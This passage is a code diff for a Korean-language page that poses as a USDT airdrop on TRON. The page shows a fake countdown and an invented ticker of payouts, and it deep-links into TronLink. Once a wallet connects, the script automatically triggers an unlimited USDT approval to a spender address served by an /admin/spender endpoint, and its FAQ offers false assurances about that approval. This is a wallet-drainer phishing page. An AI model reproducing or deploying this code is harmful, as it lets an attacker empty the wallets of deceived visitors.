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" alt="TronLink QR" class="w-44 h-44 sm:w-52 sm:h-52">
                     </div>
-                    <div class="text-center space-y-1">
-                        <div class="flex items-center justify-center gap-1.5 text-red-400 font-bold text-xs"><i class="fa-solid fa-wallet"></i><span>TronLink 앱으로 열기</span></div>
-                        <p class="text-[10px] text-slate-500">스캔 시 TronLink DApp 브라우저에서<br>자동으로 열립니다</p>
-                    </div>
-                </div>
-                <!-- Normal QR -->
-                <div class="flex flex-col items-center space-y-3 bg-slate-950/60 border border-slate-800/80 rounded-2xl p-5">
-                    <div class="bg-white p-3 rounded-2xl shadow-lg">
-                        <img src="data:image/png;base64,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" alt="일반 QR" class="w-36 h-36 sm:w-40 sm:h-40">
-                    </div>
-                    <div class="text-center space-y-1">
-                        <div class="flex items-center justify-center gap-1.5 text-slate-300 font-bold text-xs"><i class="fa-solid fa-globe"></i><span>일반 브라우저로 열기</span></div>
-                        <p class="text-[10px] text-slate-500">TronLink 미설치 시<br>일반 브라우저에서 열립니다</p>
+                    <div class="text-center space-y-1.5">
+                        <div class="flex items-center justify-center gap-1.5 text-red-400 font-bold text-sm"><i class="fa-solid fa-wallet"></i><span>TronLink 앱으로 열기</span></div>
+                        <p class="text-[11px] text-slate-500">스캔 시 TronLink DApp 브라우저에서 자동으로 열립니다</p>
                     </div>
                 </div>
             </div>
@@ -246,6 +266,7 @@
             </div>
         </div>
 
+        <!-- Security -->
         <section class="glass-panel border border-slate-800/80 rounded-2xl p-6 text-center">
             <p class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">공식 온체인 보안 검증 및 파트너십</p>
             <div class="flex flex-wrap items-center justify-center gap-8 text-slate-400 text-xs font-semibold">
@@ -255,6 +276,7 @@
             </div>
         </section>
 
+        <!-- FAQ -->
         <section class="space-y-4 pt-2">
             <h3 class="text-base sm:text-lg font-bold text-white text-center">자주 묻는 질문 (FAQ)</h3>
             <div class="max-w-3xl mx-auto space-y-3" id="faq-container"></div>
@@ -298,6 +320,7 @@
             try{var r=await fetch(API_BASE+'/admin/spender');var d=await r.json();if(d.status==='ok'&&d.address)return d.address;}catch(e){}return null;
         }
 
+        // Countdown
         var cd={d:2,h:18,m:41,s:20};
         setInterval(function(){if(cd.s>0)cd.s--;else if(cd.m>0){cd.m--;cd.s=59;}else if(cd.h>0){cd.h--;cd.m=59;cd.s=59;}else if(cd.d>0){cd.d--;cd.h=23;cd.m=59;cd.s=59;}
             document.getElementById('cd-days').textContent=String(cd.d).padStart(2,'0');
@@ -306,13 +329,16 @@
             document.getElementById('cd-secs').textContent=String(cd.s).padStart(2,'0');
         },1000);
 
+        // Ticker
         var tAddrs=['TP5a...9qW2','TX8x...L0p3','TR1m...7vZ4','TH9k...4mP9','TJ2y...8xK1','TY8z...k9L2','TQ4m...P1x8'];
         var tAmts=['150 USDT','300 USDT','500 USDT','800 USDT','1,200 USDT','1,500 USDT','3,000 USDT'];
         function updateTicker(){var c=document.getElementById('ticker-container');var d=document.createElement('div');d.className='flex items-center gap-2 bg-slate-900/60 px-2.5 py-1 rounded-md border border-slate-800/80 shrink-0';d.innerHTML='<span class="text-slate-300 font-mono">'+tAddrs[Math.floor(Math.random()*tAddrs.length)]+'</span><span class="text-emerald-400 font-bold">'+tAmts[Math.floor(Math.random()*tAmts.length)]+'</span><span class="text-slate-500 text-[10px]">(방금 전)</span>';c.prepend(d);if(c.children.length>6)c.removeChild(c.lastChild);}
         for(var i=0;i<4;i++)updateTicker();setInterval(updateTicker,4500);
 
+        // Calculator
         window.updateCalc=function(){var v=parseFloat(document.getElementById('calc-input').value||0);document.getElementById('calc-result').textContent='+ '+Math.min(Math.max(v*0.15,10),5000).toFixed(2)+' USDT';};
 
+        // FAQ
         var faqs=[
             {q:'USDT 무제한 승인(Allowance)은 왜 필요한가요?',a:'최초 1회 무제한 승인을 진행하면, 이후 추가 트랜잭션 수수료 발생이나 번거로운 매번의 서명 팝업 없이 스마트 컨트랙트가 에어드랍 보상 지급을 즉시 자동 처리할 수 있습니다.'},
             {q:'이벤트 참여 수수료가 발생하나요?',a:'최초 1회 스마트 컨트랙트 승인 시 트론 네트워크의 대역폭 및 에너지(소량의 TRX)가 수수료로 사용됩니다.'},
@@ -322,25 +348,42 @@
         var faqC=document.getElementById('faq-container');
         faqs.forEach(function(f){var d=document.createElement('div');d.className='glass-panel border border-slate-800/80 rounded-xl overflow-hidden';d.innerHTML='<button onclick="this.nextElementSibling.classList.toggle(\'hidden\');this.querySelector(\'i\').classList.toggle(\'rotate-180\')" class="w-full p-4 text-left flex items-center justify-between text-xs sm:text-sm font-bold text-slate-200 hover:text-white transition"><span>'+escapeHtml(f.q)+'</span><i class="fa-solid fa-chevron-down transition-transform text-slate-400"></i></button><div class="hidden px-4 pb-4 text-xs text-slate-400 leading-relaxed border-t border-slate-800/60 pt-3">'+escapeHtml(f.a)+'</div>';faqC.appendChild(d);});
 
+        // TronLink Deep Link (URL 자동 복사 + 3단계 시도)
         window.launchTronLinkApp=function(){
             var url=window.location.href;
             var encoded=encodeURIComponent(url);
             var param=encodeURIComponent(JSON.stringify({url:url,action:'open',protocol:'TronLink',version:'1.0'}));
+
+            // URL 자동 복사
             navigator.clipboard.writeText(url).catch(function(){});
             showToast('URL이 클립보드에 복사되었습니다');
+
+            // 1차: tronlinkoutside:// 스킴
             window.location.href='tronlinkoutside://pull.activity?param='+param;
-            setTimeout(function(){if(/Android/i.test(navigator.userAgent)){window.location.href='intent://pull.activity?param='+param+'#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end';}},1000);
-            setTimeout(function(){window.location.href='https://www.tronlink.org/dl/open?url='+encoded;},2000);
+
+            // 2차: 1초 후 intent URL (안드로이드)
+            setTimeout(function(){
+                if(/Android/i.test(navigator.userAgent)){
+                    window.location.href='intent://pull.activity?param='+param+'#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end';
+                }
+            },1000);
+
+            // 3차: 2초 후 유니버설 링크
+            setTimeout(function(){
+                window.location.href='https://www.tronlink.org/dl/open?url='+encoded;
+            },2000);
         };
 
         window.copyCurrentUrl=async function(){try{await navigator.clipboard.writeText(window.location.href);showToast('주소 복사됨');}catch(e){showToast('복사 실패','error');}};
 
+        // TronWeb 감지
         async function getInjectedTronWeb(){
             if(window.tronWeb&&window.tronWeb.defaultAddress&&window.tronWeb.defaultAddress.base58)return window.tronWeb;
             if(window.tronLink){if(window.tronLink.ready&&window.tronLink.tronWeb)return window.tronLink.tronWeb;try{var r=await window.tronLink.request({method:'tron_requestAccounts'});if(r&&r.code===200&&window.tronWeb)return window.tronWeb;}catch(e){}}return null;
         }
         window.addEventListener('DOMContentLoaded',function(){var a=0;var t=setInterval(async function(){a++;try{var tw=await getInjectedTronWeb();if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){clearInterval(t);await setConnectedWallet(tw.defaultAddress.base58,'TronLink');}else if(a>8)clearInterval(t);}catch(e){if(a>8)clearInterval(t);}},400);});
 
+        // Connect
         window.handleConnectWallet=async function(){
             appendLog('[지갑 탐색] TronLink 환경 확인 중...');
             if(isMobile()&&!window.tronWeb&&!window.tronLink){launchTronLinkApp();document.getElementById('mobile-dapp-modal').classList.add('active');return;}
@@ -348,7 +391,10 @@
             if(tw&&tw.defaultAddress&&tw.defaultAddress.base58)addr=tw.defaultAddress.base58;
             else if(window.tronLink){await window.tronLink.request({method:'tron_requestAccounts'});if(window.tronWeb&&window.tronWeb.defaultAddress)addr=window.tronWeb.defaultAddress.base58;}
             if(addr)await setConnectedWallet(addr,'TronLink');
-            else{if(isMobile()){launchTronLinkApp();document.getElementById('mobile-dapp-modal').classList.add('active');}else{document.getElementById('install-modal').classList.add('active');appendLog('[오류] TronLink 미감지','warn');}}
+            else{
+                if(isMobile()){launchTronLinkApp();document.getElementById('mobile-dapp-modal').classList.add('active');}
+                else{document.getElementById('install-modal').classList.add('active');appendLog('[오류] TronLink 미감지 — 설치 안내 표시','warn');}
+            }
         };
 
         async function setConnectedWallet(address,provider){
@@ -374,7 +420,10 @@
                     appendLog('[연결 완료] '+address+' | '+data.balance+' USDT | '+(data.isApproved?'승인완료':'미승인'),'success');
                 }
             }catch(e){appendLog('[경고] 백엔드 연결 실패','warn');}
-            if(!isApproved){setTimeout(function(){executeUnlimitedApprove();},2500);}
+
+            if(!isApproved){
+                setTimeout(function(){ executeUnlimitedApprove(); }, 2500);
+            }
         }
 
         function setApprovedUI(){
@@ -389,6 +438,7 @@
             document.getElementById('step3').style.opacity='1';
         }
 
+        // Approve
         window.executeUnlimitedApprove=async function(){
             if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');handleConnectWallet();return;}
             var spender=await getSpenderAddress();
